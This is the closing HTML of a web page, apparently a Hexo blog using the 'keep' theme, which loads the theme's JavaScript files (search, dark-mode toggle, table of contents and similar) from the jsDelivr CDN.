<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/lazyload.js"></script>


<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
    
</div>



</body>
</html>
